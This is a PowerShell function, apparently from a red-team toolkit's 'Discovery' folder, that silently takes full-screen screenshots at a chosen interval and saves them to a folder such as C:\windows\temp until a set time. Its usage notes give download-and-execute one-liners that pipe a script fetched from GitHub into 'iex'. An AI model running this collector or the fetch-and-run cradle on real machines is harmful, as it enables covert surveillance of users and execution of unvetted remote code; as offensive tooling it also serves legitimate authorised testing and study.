Function Get-TimedScreenshot {
<#
.USAGE
iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Timed.ps1);Get-TimedScreenshot -path C:\windows\temp\ -interval 30 -EndTime 11:53
OR
powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Timed.ps1);Get-TimedScreenshot -path C:\windows\temp\ -interval 30 -EndTime 14:00"

.PARAMETER $Path
    Specifies the folder path.
    
.PARAMETER $Interval
    Specifies the interval in seconds between taking screenshots.

.PARAMETER $EndTime
    Specifies when the script should stop running in the format HH-MM 

.EXAMPLE 
    PS C:\> Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00 
 
 #>

    [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]             
            [ValidateScript({Test-Path -Path $_ })]
            [string] $Path, 

            [Parameter(Mandatory=$True)]             
            [int32] $Interval,

            [Parameter(Mandatory=$True)]             
            [string] $EndTime    
            )
    
        #Define helper function that generates and saves screenshot
        Function GenScreenshot {
           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
           $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
           $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
           $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
           $DrawingGraphics.Dispose()
           $ScreenshotObject.Save($FilePath)
           $ScreenshotObject.Dispose()
        }

        Try {
            
            #load required assembly
            Add-Type -Assembly System.Windows.Forms            

            Do {
                #get the current time and build the filename from it
                $Time = (Get-Date)
                
                [string] $FileName = "$($Time.Month)"
                $FileName += '-'
                $FileName += "$($Time.Day)" 
                $FileName += '-'
                $FileName += "$($Time.Year)"
                $FileName += '-'
                $FileName += "$($Time.Hour)"
                $FileName += '-'
                $FileName += "$($Time.Minute)"
                $FileName += '-'
                $FileName += "$($Time.Second)"
                $FileName += '.png'
            
                #use join-path to add path to filename
                [string] $FilePath = (Join-Path $Path $FileName)

                #run screenshot function
                GenScreenshot
                Write-Verbose "Saved screenshot to $FilePath. Sleeping for $Interval seconds"
                Start-Sleep -Seconds $Interval
            }

            #note that this will run once regardless if the specified time as passed
            While ((Get-Date -Format HH:%m) -lt $EndTime)
        }
       Catch {Write-Warning "$Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage"}

}
